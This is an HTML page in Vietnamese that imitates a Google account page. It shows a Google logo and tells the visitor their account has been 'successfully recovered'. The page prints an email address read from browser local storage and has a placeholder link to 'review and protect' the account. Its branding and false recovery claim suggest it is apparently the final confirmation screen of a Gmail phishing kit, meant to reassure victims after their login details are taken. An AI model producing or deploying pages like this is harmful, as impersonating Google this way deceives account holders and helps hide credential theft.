<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" href="styles.css" />
  <title>Account Gmail</title>
</head>

<body>
  <div id="wrapper">
    <form id="form">
      <img id="logo" src="Logo/Google_2015_logo.svg.webp" />
      <h3>Chúng tôi đã khôi phục thành công tài khoản của bạn</h3>
      <div id="text-gmail">
        <p id="emailDisplay"></p>
      </div>
      <hr />
      <p class="text-bold">Chào mừng bạn quay lại tài khoản của mình</p>
      <p>Nếu nghi ngờ rằng bạn bị mất quyền truy cập vào tài khoản do các thay đổi mà một người khác thực hiện, thì bạn
        nên <a href="#" class="button"> xem lại và bảo vệ tài khoản của mình.</a></p>
    </form>
  </div>
  <script>
    document.addEventListener("DOMContentLoaded", function () {
      const emailDisplay = document.getElementById('emailDisplay');
      const storedEmail = localStorage.getItem('email');

      if (emailDisplay && storedEmail) {
        emailDisplay.textContent = storedEmail;
      } else {
        console.error('Không tìm thấy phần tử #text-gmail p hoặc không có email trong Local Storage.');
      }
    });
  </script>
</body>

</html>
